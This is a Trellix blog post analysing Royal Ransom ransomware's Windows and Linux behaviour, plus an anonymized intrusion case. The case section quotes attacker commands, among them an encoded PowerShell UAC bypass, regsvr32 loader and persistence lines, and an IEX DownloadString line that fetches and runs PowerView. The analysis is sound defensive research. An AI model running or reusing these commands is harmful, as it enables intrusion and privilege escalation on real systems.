       <h1 class="h3">A Royal Analysis of Royal Ransom</h1> 
       <p class="dateline">By <a href="/about/newsroom/stories/contributors/about-trellix/" datalink-id="newco:about:newsroom:stories:contributors:about-trellix:" datalink-type="internal">Trellix</a> · April 3, 2023<br> This blog was also written by Alexandre Mundo and Max Kersten</p> 
       <p><i>We would like to thank Advanced Cyber Services team within Trellix Professional Services for the incident response-related data.</i></p> 
       <p>Emerging in early 2022 as a private group which used multiple strains of ransomware, Royal Ransom has used their own ransomware since September 2022. A <a href="https://www.bleepingcomputer.com/news/security/new-royal-ransomware-emerges-in-multi-million-dollar-attacks/" target="_blank" datalink-type="external" datalink-id="newco:www.bleepingcomputer.com:news:security:new-royal-ransomware-emerges-in-multi-million-dollar-attacks:">recap</a> by Bleeping Computer contains the history of this gang. Recently, the FBI and CISA <a href="https://www.cisa.gov/sites/default/files/2023-03/aa23-061a-stopransomware-royal-ransomware.pdf" target="_blank" datalink-type="external" datalink-id="newco:www.cisa.gov:sites:default:files:2023-03:aa23-061a-stopransomware-royal-ransomware.pdf">published</a> a joint advisory, highlighting the impact of Royal Ransom. This blog will dive deep into the inner workings of Royal Ransom’s Windows and Linux executables, after which an anonymized Royal Ransom incident response case is discussed. The two executables are somewhat similar in functioning, barring some different modules, such as the existence of a network scanner in the Windows version, while the Linux version can shut ESXi virtual machines down.</p> 
       <p>Given the overlap in some of the features in Royal Ransom and Conti, such as the chunk-based encryption scheme, it is possible that one or more persons who worked with/for Conti, are now working, or have shared details with, the Royal Ransom gang. Given Conti’s downfall, actors might have switched to a different group. Alternatively, it is possible that the Royal Ransom gang reversed or read reports of Conti’s ransomware and cherry-picked features they found useful and/or interesting. </p>

       <p>Once the command-line arguments have been handled, the ransomware moves on to quietly delete all shadow copies by starting “vssadmin” as a new process, along with the required command-line arguments. The ransomware waits until the newly started “vssadmin” process completes the deletion of the shadow copies, prior to continuing its execution.</p> 
       <a href="/en-us/img/newsroom/stories/royal-ransom-3.jpg" data-fancybox="images" datalink-id="newco:en-us:img:newsroom:stories:royal-ransom-3.jpg" datalink-type="internal"> <img src="/en-us/img/newsroom/stories/royal-ransom-3.jpg" style="max-width: 100%;" class="center w-80" alt="Figure 3 - Shadow copy deletion"></a>

       </figcaption>
       <br> 
       <p>Note that the path to “vssadmin” is hardcoded to the C: drive, meaning that on any system where Windows is not installed on the C: drive, the shadow copy deletion will fail, and the ransomware will continue its execution.</p> 
       <p>Only at this point is the given ID (passed by the “-id” flag) checked for the required 32-character length. If this fails, Royal Ransom will simply stop its execution.</p> 
       <a href="/en-us/img/newsroom/stories/royal-ransom-4.jpg" data-fancybox="images" datalink-id="newco:en-us:img:newsroom:stories:royal-ransom-4.jpg" datalink-type="internal"> <img src="/en-us/img/newsroom/stories/royal-ransom-4.jpg" style="max-width: 100%;" class="center w-80" alt="Figure 4 - Victim ID length check"></a> 
       <figcaption>
        Figure 4 - Victim ID length check
       </figcaption>
       <br> 
       <p>Next, the to-be avoided extensions are initialized, partially based on stack strings and partially based on strings within the data section of the binary. The extensions to be avoided are: exe, dll, lnk, bat, and royal. Additionally, the readme.txt file will be ignored, as it will be placed by the ransomware itself.</p> 
       <p>The ransomware avoids several folders: windows, royal, $recycle.bin, google, perflogs, Mozilla, tor browser, boot, $windows.~ws, $windows.~bt, and windows.old. These folders are avoided as there is related data in them, and encrypting files in here will prevent the system from properly starting up. Malfunctioning devices are less likely to lead to contact with the ransomware crew, which is why the devices are left “functioning” to the extent that the ransom note can be read, and a decryptor can restore a device’s files.</p> 
       <h5>Setting the stage</h5> 
       <p>The encryption is then started in a multi-threaded manner, where the number of threads is equal to twice the number of processors in the victim’s machine (based on the outcome of <a href="https://learn.microsoft.com/en-us/windows/win32/api/sysinfoapi/nf-sysinfoapi-getnativesysteminfo" target="_blank" datalink-type="external" datalink-id="newco:learn.microsoft.com:en-us:windows:win32:api:sysinfoapi:nf-sysinfoapi-getnativesysteminfo">GetNativeSystemInfo</a>). As such, the system’s scheduler will not be overloaded by too many threads, while still performing tasks in parallel.</p> 
       <a href="/en-us/img/newsroom/stories/royal-ransom-5.jpg" data-fancybox="images" datalink-id="newco:en-us:img:newsroom:stories:royal-ransom-5.jpg" datalink-type="internal"> <img src="/en-us/img/newsroom/stories/royal-ransom-5.jpg" style="max-width: 100%;" class="center w-80" alt="Figure 5 - Encryption thread creation"></a> 
       <figcaption>
        Figure 5 - Encryption thread creation
       </figcaption>
       <br> 
       <p>Rather than starting the encryption with the cryptography related threads while traversing files, the threads wait for conditional variables to signal the availability of a target file. </p> 
       <p>Each thread will import the RSA public key, which is embedded in the malware sample, to encrypt the AES and IV values, which will be used to encrypt the files. </p> 
       <a href="/en-us/img/newsroom/stories/royal-ransom-6.jpg" data-fancybox="images" datalink-id="newco:en-us:img:newsroom:stories:royal-ransom-6.jpg" datalink-type="internal"> <img src="/en-us/img/newsroom/stories/royal-ransom-6.jpg" style="max-width: 100%;" class="center w-80" alt="Figure 6 - Encryption thread creation"></a> 
       <figcaption>
        Figure 6 - The public RSA key
       </figcaption>
       <br> 
       <p>Note that if the RSA public key cannot be obtained, for any given reason, the thread will simply exit. To avoid the usage of the Windows API’s cryptographic functions, which would show up in static analysis or would need to be resolved dynamically, the OpenSSL library is statically linked with the malware, which provides similar functionality. The used encryption is, unfortunately, correctly implemented.</p> 
       <p>To avoid the attempted encryption of a locked file, the ransomware first checks if it is locked. If it is, the Windows Restart Manager is used to ensure the file is available. Notably, two processes are excluded from freeing it up: “explorer.exe” and the Royal Ransom process. If the process is locked by neither of these two, the Restart Manager is used.</p> 
       <a href="/en-us/img/newsroom/stories/royal-ransom-7.jpg" data-fancybox="images" datalink-id="newco:en-us:img:newsroom:stories:royal-ransom-7.jpg" datalink-type="internal"> <img src="/en-us/img/newsroom/stories/royal-ransom-7.jpg" style="max-width: 100%;" class="center w-80" alt="Figure 7 - Process iteration"></a> 
       <figcaption>
        Figure 7 - Process iteration
       </figcaption>
       <br> 
       <p>With “RmStartSession” the session is started, after which “RmRegisterResources” is used to register the resources (being the file in this case). After that, “RmGetList” is used to check which application(s) and/or service(s) lock the resources, which are then closed using “RmShutdown”, thus removing the lock.</p> 
       <a href="/en-us/img/newsroom/stories/royal-ransom-8.jpg" data-fancybox="images" datalink-id="newco:en-us:img:newsroom:stories:royal-ransom-8.jpg" datalink-type="internal"> <img src="/en-us/img/newsroom/stories/royal-ransom-8.jpg" style="max-width: 100%;" class="center w-80" alt="Figure 8 - Restart Manager related functions to free to process"></a> 
       <figcaption>
        Figure 8 - Restart Manager related functions to free to process
       </figcaption>

       <h5>File Encryption</h5> 
       <p>The file encryption is based on chunks of data of a given file. The optional flag to provide the encryption percentage specifies how many blocks will need to be encrypted within the given file, based on the file’s size. Not providing the flag, half of the file will be encrypted.</p> 
       <p>The granular approach by allowing each execution of the ransomware to encrypt a given percentage of each file allows operators to decide if they’d like to go for a fast-yet-less-secure approach, or a slow-yet-secure approach. When going to for a percentage that is too low, files might be recoverable, but the encryption time is insignificant. Using a high percentage, i.e. 90 will encrypt more data, making it difficult if not impossible to recover without the key, while using a significant amount of time to encrypt the files. Additionally, not encrypting the file in-full will avoid heavy disk usage, which is what security products can trigger to block ransomware.</p> 
       <p>The original files will, once (partially) encrypted, be increased with 528 bytes. The RSA block, the original file size, and the encryption percentage value are stored within the newly created space. The sizes of the given fields are, respectively, 512, 8, and 8 bytes.</p> 
       <p>The encryption percentage isn’t applied to all files: any file that is less or equal than 5245000 bytes in size (or 5 megabytes, when adhering to 1024 bytes per kilobyte, rather than the often used 1000) is encrypted in full, regardless of the given encryption percentage.</p>

       <h5>Network Scanner</h5> 
       <p>If no path was given via the command-line interface, the malware will get all the IP addresses on the victim’s device, and subsequently scan the network based on a subset of the obtained IPs. Only the addresses which start with the octet equal to “192”, “10”, “100”, or “172” are used, as these tend to correspond with local networks.</p> 
       <a href="/en-us/img/newsroom/stories/royal-ransom-16.jpg" data-fancybox="images" datalink-id="newco:en-us:img:newsroom:stories:royal-ransom-16.jpg" datalink-type="internal"> <img src="/en-us/img/newsroom/stories/royal-ransom-16.jpg" style="max-width: 100%;" class="center w-80" alt="Figure 16 - Compare the obtained IP with the targeted addresses"></a>

Initially, the malware used the WinSock library to establish a TCP socket connection using “WSAIoctl” to connect to “ConnectEx”. This way, connections that were made earlier on the victim’s machine are enumerated and re-used, if possible, with the goal to encrypt files on the connected devices as well.</p>

       <h5>The Linux Version</h5>

If the randomness isn’t enough, 2048 bytes from “/dev/random” is read to seed it. If an error occurs during the reading of the data, or when calling any of the random functions, the malware terminates itself. </p>

       <h5>Terminating Virtual Machines</h5> 
       <p>The “-stopvm” flag is used to stop VMware ESXi virtual machines that are running on the host. First the “esxcli” binary is executed via a new shell, with “vm process list &gt; list” as parameters, which serve to store the list of existing virtual machines in the file “list” by redirecting the standard output to the file. The shell which executes the ESXi command-line interface command is called via “execlp”, which overlays the forked process with the called process. </p> 
       <a href="/en-us/img/newsroom/stories/royal-ransom-24.jpg" data-fancybox="images" datalink-id="newco:en-us:img:newsroom:stories:royal-ransom-24.jpg" datalink-type="internal"> <img src="/en-us/img/newsroom/stories/royal-ransom-24.jpg" style="max-width: 100%;" class="center w-80" alt="Figure 24 - Terminate VMs"></a>

       </figcaption>
       <br> 
       <p>At last, the child process exits. The parent process, which is Royal Ransom, will wait for the child to finish before it opens the “list” file. If it does not exist, the function will return. If it does return, the file size of “list” is checked. If this fails, the function returns as well.</p> 
       <a href="/en-us/img/newsroom/stories/royal-ransom-25.jpg" data-fancybox="images" datalink-id="newco:en-us:img:newsroom:stories:royal-ransom-25.jpg" datalink-type="internal"> <img src="/en-us/img/newsroom/stories/royal-ransom-25.jpg" style="max-width: 100%;" class="center w-80" alt="Figure 25 - Read the ‘list’ file‚s size"></a>

       <h5>File Encryption</h5> 
       <p>The encryption can be performed by the main process, or by a forked process, depending on the “-fork” flag, or the absence thereof. If the fork flag is set, a new session, using “setsid” is created, and the encryption is started. If the flag isn’t set, the encryption starts from the main process.</p> 
       <a href="/en-us/img/newsroom/stories/royal-ransom-29.jpg" data-fancybox="images" datalink-id="newco:en-us:img:newsroom:stories:royal-ransom-29.jpg" datalink-type="internal"> <img src="/en-us/img/newsroom/stories/royal-ransom-29.jpg" style="max-width: 100%;" class="center w-80" alt="Figure 29 - Creates a new session (based on the ‘-fork’ flag) and starts the encryption"></a> 
       <figcaption>
        Figure 29 - Creates a new session (based on the "-fork" flag) and starts the encryption
       </figcaption>
       <br> 
       <p>The number of threads that are created to encrypt files with, is equal to two times the number of processors, which is obtained using “sysconf”. The calculation is the same as in the Windows variant.</p> 
       <p>The public RSA key, which is embedded in the malware, is imported. The complete public key is given at the start of this blog. If the import fails, the thread returns.</p> 
       <a href="/en-us/img/newsroom/stories/royal-ransom-30.jpg" data-fancybox="images" datalink-id="newco:en-us:img:newsroom:stories:royal-ransom-30.jpg" datalink-type="internal"> <img src="/en-us/img/newsroom/stories/royal-ransom-30.jpg" style="max-width: 100%;" class="center w-80" alt="Figure 30 - Import the RSA key"></a> 
       <figcaption>
        Figure 30 - Import the RSA key
       </figcaption>
       <br> 
       <p>The encryption threads read, much like in the Windows version, the target files from a list. If the list is empty the encryption threads wait. The encryption process starts by obtaining the target file’s size. Next, 48 bytes are randomly generated using random functions, and by reading from “/dev/random”. The first 32 bytes are the AES key, and the last 16 bytes are the IV.</p> 
       <a href="/en-us/img/newsroom/stories/royal-ransom-31.jpg" data-fancybox="images" datalink-id="newco:en-us:img:newsroom:stories:royal-ransom-31.jpg" datalink-type="internal"> <img src="/en-us/img/newsroom/stories/royal-ransom-31.jpg" style="max-width: 100%;" class="center w-80" alt="Figure 31 - Generate the RSA block"></a> 
       <figcaption>
        Figure 31 - Generate the RSA block
       </figcaption>
       <br> 
       <p>Both values will be encrypted with the previously imported RSA public key. The first 512 bytes of the encryption will be saved in the encrypted file, much like in the Windows version. The values will be encrypted with the RSA imported key previously, and the 512 bytes block of the encryption later will be saved in the file as in the Windows version.</p> 
       <p>The usage of chunks is the same as the Windows version, where the encryption percentage is given via the command-line interface, or the default value of 50 is used. Again, files which are less than or equal to 5245000 bytes (5 megabytes, when adhering to 1024 bytes in a kilobyte, and so forth) are fully encrypted. Otherwise, the percentage decides the chunk sizes, which ensures the file is encrypted for a given percentage.</p> 
       <a href="/en-us/img/newsroom/stories/royal-ransom-32.jpg" data-fancybox="images" datalink-id="newco:en-us:img:newsroom:stories:royal-ransom-32.jpg" datalink-type="internal"> <img src="/en-us/img/newsroom/stories/royal-ransom-32.jpg" style="max-width: 100%;" class="center w-80" alt="Figure 32 - Encryption ‘sanity’ checks"></a>

       </figcaption>
       <br> 
       <p>The encrypted file’s size is inflated again, with 512 bytes to store the encrypted RSA block, 8 bytes for the original file size, and 8 bytes to store the encryption percentage value.</p>

Afterwards, the written data is flushed, ensuring that the encrypted file’s data is written to the disk. The flushing is done with “fsync”. Additionally, the extension “.royal_u” is appended to the filename.</p>

       <h5>Recursive Folder Enumeration</h5> 
       <p>Much like any ransomware family, Royal Ransom enumerates all folders on the device recursively to find files which can be encrypted. The first command-line interface argument, the path, is used as the starting point. If the provided value is not a valid path, the malware will terminate. If it is, the malware assumes it is a directory, and put a ransom note within the given folder, under the “readme” name. The given victim ID is replaced within the ransom note.</p> 
       <a href="/en-us/img/newsroom/stories/royal-ransom-35.jpg" data-fancybox="images" datalink-id="newco:en-us:img:newsroom:stories:royal-ransom-35.jpg" datalink-type="internal"> <img src="/en-us/img/newsroom/stories/royal-ransom-35.jpg" style="max-width: 100%;" class="center w-80" alt="Figure 35 - Write the ransom note"></a>

       </figcaption>
       <br> 
       <p>After that, the file encryption starts recursively, excluding folders where the name is equal to one or two dots.</p>

The “royal_w” seems to be a reference to the Windows version’s encrypted file extension, even though the “_w” part isn’t used in the Windows version. The “royal_log_” name seems to not be used by the ransomware.</p> 
       <a href="/en-us/img/newsroom/stories/royal-ransom-37.jpg" data-fancybox="images" datalink-id="newco:en-us:img:newsroom:stories:royal-ransom-37.jpg" datalink-type="internal"> <img src="/en-us/img/newsroom/stories/royal-ransom-37.jpg" style="max-width: 100%;" class="center w-80" alt="Figure 37 - Excluded file names"></a>

        Figure 37 - Excluded file names
       </figcaption>
       <br> 
       <p>If a file is “eligible” for encryption, it is added to the list, which the encryption threads take items from to encrypt, after which they are removed from the list. Once all folders have been recursively iterated through, the malware shuts down.</p> 
       <h5>An Anonymized Incident Response Case</h5> 
       <p>This section contains an anonymized incident response case, which is why certain indicators of compromise are omitted. The focus of this case is to show the tactics, techniques, and procedures (TTPs) of an actor who encrypted systems with Royal Ransom. The events in this case are described in chronological order, and happened in the last quarter of 2022. </p> 
       <p>The actor obtained the original initial access with a phishing e-mail. This e-mail, based on an existing and benign e-mail thread, contained a malicious attachment in the form of a HTML file (HTML smuggling). Upon opening the HTML file, an archive download prompt pops up. The webpage is a lure which instructs the victim to download a file to correctly display the file. The password for the archive is also given on the page.</p> 
       <a href="/en-us/img/newsroom/stories/royal-ransom-38.jpg" data-fancybox="images" datalink-id="newco:en-us:img:newsroom:stories:royal-ransom-38.jpg" datalink-type="internal"> <img src="/en-us/img/newsroom/stories/royal-ransom-38.jpg" style="max-width: 100%;" class="center w-80" alt="Figure 38 - The lure image"></a> 
       <figcaption>
        Figure 38 - The lure image
       </figcaption>
       <br> 
       <p>The archive itself contains an ISO image. This image, when mounted, contains multiple files: a shortcut (LNK) and a hidden folder with a decoy file, a batch file, and the Qbot payload. The batch file and Qbot payload are named “revalues.cmd” and “vindictive.dat” respectively. The batch script copies the Qbot malware to the victim’s temporary folder and executes the payload from the mounted drive using “regsvr32”. The Batch script is executed using: “C:\Windows\System32\cmd.exe /c standby\revalues.cmd regs”. The “regs” argument is used to complete the “regsvr32” name during the execution, as can be seen in the script’s excerpt below.</p> 
       <a href="/en-us/img/newsroom/stories/royal-ransom-39.jpg" data-fancybox="images" datalink-id="newco:en-us:img:newsroom:stories:royal-ransom-39.jpg" datalink-type="internal"> <img src="/en-us/img/newsroom/stories/royal-ransom-39.jpg" style="max-width: 100%;" class="center w-80" alt="Figure 39 - Part of the batch script"></a> 
       <figcaption>
        Figure 39 - Part of the batch script
       </figcaption>
       <br> 
       <p>Qbot later persists itself, with the help of <a href="https://learn.microsoft.com/en-us/windows/win32/setupapi/run-and-runonce-registry-keys" target="_blank" datalink-type="external" datalink-id="newco:learn.microsoft.com:en-us:windows:win32:setupapi:run-and-runonce-registry-keys">Run</a>n registry entry, in the startup order. The entry executes Qbot, again using “regsvr32”, every time the machine starts: “regsvr32.exe “C:\Users\[redacted]\AppData\Roaming\Microsoft\Jmcoiqtmeft\nwthu.dll””. Note the double quotation marks to ensure the execution is successful even if the path contains one or more spaces.</p> 
       <p>About four hours after the initial infection, Cobalt Strike was installed as a service on a domain controller, running on the localhost’s port 11925. Note that the lateral movement to a foothold on the domain controller was performed using Pass-the-Hash. The lateral movement started an hour after the initial infection and took a bit more than two hours. Additional tools to enumerate the active directory network were used, such as <a href="https://www.joeware.net/freetools/tools/adfind/" target="_blank" datalink-type="external" datalink-id="newco:www.joeware.net:freetools:tools:adfind:">AdFind</a>.</p> 
       <p>To escalate privileges during the lateral movement, a UAC bypass was used. This bypass is based on a race condition in Windows 10’s Disk Cleanup tool, as is explained <a href="https://enigma0x3.net/2016/07/22/bypassing-uac-on-windows-10-using-disk-cleanup/" target="_blank" datalink-type="external" datalink-id="newco:enigma0x3.net:2016:07:22:bypassing-uac-on-windows-10-using-disk-cleanup:">here</a>, where a DLL hijack can lead to arbitrary code execution with elevated privileges. The command to execute the UAC bypass is: “C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -NonI -w Hidden -c $x=$((gp HKCU:Software\Microsoft\Windows Update).Update); powershell -NoP -NonI -w Hidden -enc $x; Start-Sleep -Seconds 1\system32\cleanmgr.exe /autoclean /d C:”</p> 
       <p>The elevated privileges were used to run a PowerShell command which launches <a href="https://github.com/PowerShellMafia/PowerSploit" target="_blank" datalink-type="external" datalink-id="newco:github.com:powershellmafia:powersploit">PowerSploit</a> (a post-exploitation framework) via Cobalt Strike’s service on port 11925. In this case, the <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1" target="_blank" datalink-type="external" datalink-id="newco:github.com:powershellmafia:powersploit:blob:master:recon:powerview.ps1">PowerView</a> module got downloaded and executed. The module got downloaded using a PowerShell command: “IEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:11925/')”.</p> 
       <p>A few days later, once the actors got a firm foothold on the network, they used <a href="https://github.com/meganz/MEGAsync" target="_blank" datalink-type="external" datalink-id="newco:github.com:meganz:megasync">MEGAsync</a> to exfiltrate more than 25 gigabytes of data. Yet another few days later, the Royal Ransom was deployed. Noteworthy here is the executable’s name, which was tailed to the victim’s name. This shows the manual involvement of the actor.</p>

       <h5>Conclusion</h5> 
       <p>The Royal Ransom is actively used, as highlighted by the incident response case. Additionally, the ransomware’s encryption scheme seems to be implemented properly. As such, recent back-ups or a decryptor are the only ways to recover lost files. The chunk-based encryption speeds up the encryption process while still ensuring files aren’t recoverable.</p> 
       <p>The re-use of features between ransomware groups, such as Royal Ransom and Conti in this alleged case, gives food for thought with regards to gangs collaborating, or gang members joining different (or additional) gangs. Bluntly put, the evolution of one gang’s ransomware is bound to influence other ransomware gangs, which affects any organization that is targeted. As such, it is important to stay on-top of changes and improve the security posture where required.</p>
